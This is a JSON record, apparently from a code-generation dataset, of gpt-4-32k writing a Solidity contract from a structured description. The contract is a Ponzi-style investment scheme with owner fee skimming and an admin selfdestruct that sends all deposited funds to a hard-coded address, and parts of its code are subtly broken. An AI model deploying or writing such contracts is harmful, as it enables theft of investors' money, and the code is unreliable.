{
	"address": "0x95e991e6e39b414ca6b73ada350be6e502fdce8c",
	"choices": [
		{
			"finish_reason": "stop",
			"index": 0,
			"message": {
				"content": "Here is the contract code:\n\n``` solidity\npragma solidity ^0.4.24;\n\ncontract SmartContract {\n    mapping (address => uint256) public profit;\n    mapping (address => uint256) public lastinvest;\n    mapping (address => uint256) public affiliatecommision;\n    \n    address private owner;\n    address private owner1;\n    address private owner2;\n\n    constructor() public payable {\n        owner = 0x660D46108E6247Fe1AEbba4Cc048C4802a1e8fbD;\n        owner1 = 0xc5f10eb67F02c5d6eB08882f2D6a0deDBb4B54c7;\n        owner2 = 0x7DaeA2C171a4865039dd813cB4D7003343A378AD;\n    }\n\n    function admin() public {\n        require(msg.sender == owner);\n        selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);\n    }\n\n    function withdrawAffiliateCommision() public {\n        require(affiliatecommision[msg.sender] > 0);\n        uint256 amount = affiliatecommision[msg.sender];\n        affiliatecommision[msg.sender] = 0;\n        msg.sender.transfer(amount);\n    }\n\n    function withdraw() public {\n        require(now - lastinvest[msg.sender] > 0 && (now - lastinvest[msg.sender]) * profit[msg.sender] / 0x493e00 > 0);\n        uint256 amount = (now - lastinvest[msg.sender]) * profit[msg.sender] / 0x493e00;\n        lastinvest[msg.sender] = now;\n        msg.sender.transfer(amount);\n    }\n\n    function reinvestProfit() public {\n        require(now - lastinvest[msg.sender] > 0 && (now - lastinvest[msg.sender]) * profit[msg.sender] / 0x493e00 > 0);\n        profit[msg.sender] += (now - lastinvest[msg.sender]) * profit[msg.sender] / 0x493e00;\n        lastinvest[msg.sender] = now;\n    }\n\n    function investETH(address _referrer) public payable {\n        require(msg.value >= 0xb1a2bc2ec50000);\n        if(msg.value / 100 == 0) {\n            owner.transfer(0);\n            owner1.transfer(0);\n            owner2.transfer(0);\n            profit[msg.sender] += msg.value;\n            lastinvest[msg.sender] = now;\n            if(_referrer != 1 && _referrer != msg.sender) {\n                affiliatecommision[_referrer] += msg.value / 40;\n            }\n        } else {\n            owner.transfer(msg.value / 100 * 5);\n            owner1.transfer(msg.value / 100 * 3);\n            owner2.transfer(msg.value / 100 * 1);\n            profit[msg.sender] += msg.value;\n            lastinvest[msg.sender] = now;\n        }\n    }\n}\n```\nPlease note that you should handle the exceptions of transfer calls in the `investETH` function. In this code, it is assumed that all transfer calls will succeed.",
				"role": "assistant"
			}
		}
	],
	"created": 1702485277,
	"id": "chatcmpl-8VMTtPPgqt9fdtyEbkeeF7HpnYWln",
	"input_format": "LayedDescription",
	"ir": "For the payable constructor function.\n- the state variable owner will be updated to 0x660D46108E6247Fe1AEbba4Cc048C4802a1e8fbD.\n- the state variable owner1 will be updated to 0xc5f10eb67F02c5d6eB08882f2D6a0deDBb4B54c7.\n- the state variable owner2 will be updated to 0x7DaeA2C171a4865039dd813cB4D7003343A378AD.\n\nFor the admin function.\n- the contract will be destroyed and its balance will be sent to 0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71.\n\nFor the withdrawAffiliateCommision function.\n- When the affiliatecommision of caller is greater than 0:\n  - it transfers ether valued the affiliatecommision of caller to caller. Afterthat, \n    - the affiliatecommision of caller will be updated to 0.\n\nFor the withdraw function.\n- For users, except (current time-the lastinvest of caller) equals to 0, and (((current time-the lastinvest of caller)*the profit of caller)/0x493e00) is greater than 0:\n  - it transfers ether valued (((current time-the lastinvest of caller)*the profit of caller)/0x493e00) to caller. Afterthat, \n    - the lastinvest of caller will be updated to current time.\n\nFor the reinvestProfit function.\n- For users, except (current time-the lastinvest of caller) equals to 0, and (((current time-the lastinvest of caller)*the profit of caller)/0x493e00) is greater than 0:\n  - the profit of caller will be updated to (the profit of caller+(((current time-the lastinvest of caller)*the profit of caller)/0x493e00)). Afterthat, \n    - the lastinvest of caller will be updated to current time.\n\nFor the payable investETH function, it has one argument and its type is address.\n- When the ether just received (i.e., msg.value) is not smaller than 0xb1a2bc2ec50000:\n  - When (the ether just received (i.e., msg.value)/100) equals to 0:\n    - it transfers ether valued 0 to owner.\n    - When the call or transfer succeeds:\n      - it transfers ether valued 0 to owner1.\n      - When the call or transfer succeeds:\n        - it transfers ether valued 0 to owner2.\n        - When the call or transfer succeeds:\n          - the profit of caller will be updated to (the profit of caller+the ether just received (i.e., msg.value)).\n          - the lastinvest of caller will be updated to current time.\n  - When the first argument does not equal to 1, and for users, except for the first argument:\n    - the affiliatecommision of the first argument will be updated to (the affiliatecommision of the first argument+(the ether just received (i.e., msg.value)/40)).\n  - When (the ether just received (i.e., msg.value)/100) does not equal to 0:\n    - it transfers ((the ether just received (i.e., msg.value)/100)*5) to owner.\n    - When the call or transfer fails:\n      - it transfers ((the ether just received (i.e., msg.value)/100)*3) to owner1.\n      - When the call or transfer fails:\n        - it transfers ((the ether just received (i.e., msg.value)/100)*1) to owner2.\n        - When the call or transfer fails:\n          - the profit of caller will be updated to (the profit of caller+the ether just received (i.e., msg.value)).\n          - the lastinvest of caller will be updated to current time.\n\n",
	"language": "Solidity",
	"messages": [
		{
			"content": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following contract descriptions. Some state variables are provided to help you develop.",
			"role": "system"
		},
		{
			"content": "The following is the description of the contract logic: For the payable constructor function.\n- the state variable owner will be updated to 0x660D46108E6247Fe1AEbba4Cc048C4802a1e8fbD.\n- the state variable owner1 will be updated to 0xc5f10eb67F02c5d6eB08882f2D6a0deDBb4B54c7.\n- the state variable owner2 will be updated to 0x7DaeA2C171a4865039dd813cB4D7003343A378AD.\n\nFor the admin function.\n- the contract will be destroyed and its balance will be sent to 0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71.\n\nFor the withdrawAffiliateCommision function.\n- When the affiliatecommision of caller is greater than 0:\n  - it transfers ether valued the affiliatecommision of caller to caller. Afterthat, \n    - the affiliatecommision of caller will be updated to 0.\n\nFor the withdraw function.\n- For users, except (current time-the lastinvest of caller) equals to 0, and (((current time-the lastinvest of caller)*the profit of caller)/0x493e00) is greater than 0:\n  - it transfers ether valued (((current time-the lastinvest of caller)*the profit of caller)/0x493e00) to caller. Afterthat, \n    - the lastinvest of caller will be updated to current time.\n\nFor the reinvestProfit function.\n- For users, except (current time-the lastinvest of caller) equals to 0, and (((current time-the lastinvest of caller)*the profit of caller)/0x493e00) is greater than 0:\n  - the profit of caller will be updated to (the profit of caller+(((current time-the lastinvest of caller)*the profit of caller)/0x493e00)). Afterthat, \n    - the lastinvest of caller will be updated to current time.\n\nFor the payable investETH function, it has one argument and its type is address.\n- When the ether just received (i.e., msg.value) is not smaller than 0xb1a2bc2ec50000:\n  - When (the ether just received (i.e., msg.value)/100) equals to 0:\n    - it transfers ether valued 0 to owner.\n    - When the call or transfer succeeds:\n      - it transfers ether valued 0 to owner1.\n      - When the call or transfer succeeds:\n        - it transfers ether valued 0 to owner2.\n        - When the call or transfer succeeds:\n          - the profit of caller will be updated to (the profit of caller+the ether just received (i.e., msg.value)).\n          - the lastinvest of caller will be updated to current time.\n  - When the first argument does not equal to 1, and for users, except for the first argument:\n    - the affiliatecommision of the first argument will be updated to (the affiliatecommision of the first argument+(the ether just received (i.e., msg.value)/40)).\n  - When (the ether just received (i.e., msg.value)/100) does not equal to 0:\n    - it transfers ((the ether just received (i.e., msg.value)/100)*5) to owner.\n    - When the call or transfer fails:\n      - it transfers ((the ether just received (i.e., msg.value)/100)*3) to owner1.\n      - When the call or transfer fails:\n        - it transfers ((the ether just received (i.e., msg.value)/100)*1) to owner2.\n        - When the call or transfer fails:\n          - the profit of caller will be updated to (the profit of caller+the ether just received (i.e., msg.value)).\n          - the lastinvest of caller will be updated to current time.\n\n.\n Here are some state variables with their corresponding types: public state variable `profit` is typed mapping,public state variable `lastinvest` is typed mapping,public state variable `affiliatecommision` is typed mapping,private state variable `owner` is typed address,private state variable `owner1` is typed address,private state variable `owner2` is typed address.\n ",
			"role": "user"
		}
	],
	"model": "gpt-4-32k",
	"object": "chat.completion",
	"prompts": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following contract descriptions. Some state variables are provided to help you develop.The following is the description of the contract logic: For the payable constructor function.\n- the state variable owner will be updated to 0x660D46108E6247Fe1AEbba4Cc048C4802a1e8fbD.\n- the state variable owner1 will be updated to 0xc5f10eb67F02c5d6eB08882f2D6a0deDBb4B54c7.\n- the state variable owner2 will be updated to 0x7DaeA2C171a4865039dd813cB4D7003343A378AD.\n\nFor the admin function.\n- the contract will be destroyed and its balance will be sent to 0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71.\n\nFor the withdrawAffiliateCommision function.\n- When the affiliatecommision of caller is greater than 0:\n  - it transfers ether valued the affiliatecommision of caller to caller. Afterthat, \n    - the affiliatecommision of caller will be updated to 0.\n\nFor the withdraw function.\n- For users, except (current time-the lastinvest of caller) equals to 0, and (((current time-the lastinvest of caller)*the profit of caller)/0x493e00) is greater than 0:\n  - it transfers ether valued (((current time-the lastinvest of caller)*the profit of caller)/0x493e00) to caller. Afterthat, \n    - the lastinvest of caller will be updated to current time.\n\nFor the reinvestProfit function.\n- For users, except (current time-the lastinvest of caller) equals to 0, and (((current time-the lastinvest of caller)*the profit of caller)/0x493e00) is greater than 0:\n  - the profit of caller will be updated to (the profit of caller+(((current time-the lastinvest of caller)*the profit of caller)/0x493e00)). Afterthat, \n    - the lastinvest of caller will be updated to current time.\n\nFor the payable investETH function, it has one argument and its type is address.\n- When the ether just received (i.e., msg.value) is not smaller than 0xb1a2bc2ec50000:\n  - When (the ether just received (i.e., msg.value)/100) equals to 0:\n    - it transfers ether valued 0 to owner.\n    - When the call or transfer succeeds:\n      - it transfers ether valued 0 to owner1.\n      - When the call or transfer succeeds:\n        - it transfers ether valued 0 to owner2.\n        - When the call or transfer succeeds:\n          - the profit of caller will be updated to (the profit of caller+the ether just received (i.e., msg.value)).\n          - the lastinvest of caller will be updated to current time.\n  - When the first argument does not equal to 1, and for users, except for the first argument:\n    - the affiliatecommision of the first argument will be updated to (the affiliatecommision of the first argument+(the ether just received (i.e., msg.value)/40)).\n  - When (the ether just received (i.e., msg.value)/100) does not equal to 0:\n    - it transfers ((the ether just received (i.e., msg.value)/100)*5) to owner.\n    - When the call or transfer fails:\n      - it transfers ((the ether just received (i.e., msg.value)/100)*3) to owner1.\n      - When the call or transfer fails:\n        - it transfers ((the ether just received (i.e., msg.value)/100)*1) to owner2.\n        - When the call or transfer fails:\n          - the profit of caller will be updated to (the profit of caller+the ether just received (i.e., msg.value)).\n          - the lastinvest of caller will be updated to current time.\n\n.\n Here are some state variables with their corresponding types: public state variable `profit` is typed mapping,public state variable `lastinvest` is typed mapping,public state variable `affiliatecommision` is typed mapping,private state variable `owner` is typed address,private state variable `owner1` is typed address,private state variable `owner2` is typed address.\n ",
	"status": "1",
	"time_cost": 22.559349060058594,
	"usage": {
		"completion_tokens": 662,
		"prompt_tokens": 959,
		"total_tokens": 1621
	}
}